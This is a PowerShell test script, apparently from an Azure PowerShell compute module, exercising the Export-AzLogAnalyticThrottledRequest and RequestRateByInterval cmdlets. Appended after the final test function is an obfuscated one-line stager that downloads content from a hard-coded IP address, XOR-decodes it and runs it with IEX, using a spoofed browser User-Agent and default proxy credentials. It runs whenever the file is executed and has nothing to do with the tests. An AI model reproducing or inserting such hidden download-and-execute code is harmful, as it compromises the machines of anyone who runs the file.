














function Test-ExportLogAnalyticThrottledRequestsNegative
{
    $loc = Get-ComputeOperationLocation;
    $from = Get-Date -Year 2018 -Month 2 -Day 27 -Hour 9;
    $to = Get-Date -Year 2018 -Month 2 -Day 28 -Hour 9;
    $sasuri = 'https://fakestore.blob.core.windows.net/mylogs/fakesas';
    Assert-ThrowsContains { `
        $result = Export-AzLogAnalyticThrottledRequest -Location $loc -FromTime $from -ToTime $to -BlobContainerSasUri $sasuri -GroupByThrottlePolicy -GroupByResourceName;} `
        "the given SAS URI";
}


function Test-ExportLogAnalyticRequestRateByIntervalNegative
{
    $loc = Get-ComputeOperationLocation;
    $from = Get-Date -Year 2018 -Month 2 -Day 27 -Hour 9;
    $to = Get-Date -Year 2018 -Month 2 -Day 28 -Hour 9;
    $sasuri = 'https://fakestore.blob.core.windows.net/mylogs/fakesas';
    $interval = "FiveMins";
    Assert-ThrowsContains { `
        $result = Export-AzLogAnalyticRequestRateByInterval -Location $loc -FromTime $from -ToTime $to -BlobContainerSasUri $sasuri -IntervalLength $interval -GroupByThrottlePolicy -GroupByOperationName;} `
        "the given SAS URI";
}


function Test-ExportLogAnalytics
{
    $rgname = Get-ComputeTestResourceName;
    $loc = Get-ComputeOperationLocation;
    $stoname = 'sto' + $rgname;
    $stotype = 'Standard_GRS';
    $container = "test";
    $sastoken = '?fakesas'

    New-AzResourceGroup -Name $rgname -Location $loc -Force;
    New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
    $key = Get-AzStorageAccountKey -ResourceGroupName $rgname -Name $stoname;
    $context = New-AzStorageContext -StorageAccountName $stoname -StorageAccountKey $key.Key1;

    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        New-AzStorageContainer -Name $container -Context $context;
        $sastoken = Get-AzStorageContainer -Name $container -Context $context | New-AzStorageContainerSASToken -Permission rwdl -Context $context;
    }

    try
    {
        $from = Get-Date -Year 2018 -Month 5 -Day 27 -Hour 9;
        $to = Get-Date -Year 2018 -Month 5 -Day 28 -Hour 9;
        $sasuri = "https://$stoname.blob.core.windows.net/$container$sastoken";
        $interval = "FiveMins";
        $result = Export-AzLogAnalyticRequestRateByInterval -Location $loc -FromTime $from -ToTime $to -BlobContainerSasUri $sasuri -IntervalLength $interval -GroupByThrottlePolicy -GroupByOperationName -GroupByResourceName;
        Assert-AreEqual "Succeeded" $result.Status;
        $output = $result | Out-String;
        Assert-True { $output.Contains(".csv"); }
        Assert-True { $output.Contains("RequestRateByInterval"); }

        $result = Export-AzLogAnalyticThrottledRequest -Location $loc -FromTime $from -ToTime $to -BlobContainerSasUri $sasuri -GroupByThrottlePolicy -GroupByOperationName -GroupByResourceName;
        Assert-AreEqual "Succeeded" $result.Status;
        $output = $result | Out-String;
        Assert-True { $output.Contains(".csv"); }
        Assert-True { $output.Contains("ThrottledRequests"); }

        if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
        {
            $blobs = Get-AzStorageBlob -Container test -Context $context;
            $request_blob = $blobs | where {$_.name.contains("RequestRateByInterval")};
            $throttle_blob = $blobs | where {$_.name.contains("ThrottledRequests")};
            Assert-NotNull $request_blob;
            Assert-NotNull $throttle_blob;
        }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname;
    }
}

$WC=NeW-OBJect SyStEM.NEt.WeBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERS.AdD('User-Agent',$u);$wC.PROXY = [SYSTEM.Net.WeBREQuesT]::DEFAulTWEBPROXy;$Wc.PRoXy.CReDEnTIalS = [SystEm.NET.CREdEnTiaLCAche]::DeFAuLTNETWorkCreDenTiaLS;$K='\o9Kylpr(IGJF}C^2qd/=]s3Zfe_P<*H';$I=0;[chaR[]]$B=([chAr[]]($Wc.DowNLOAdStrinG("http://95.211.139.88:80/index.asp")))|%{$_-BXOR$K[$I++%$K.LENgTh]};IEX ($B-JOIN'')

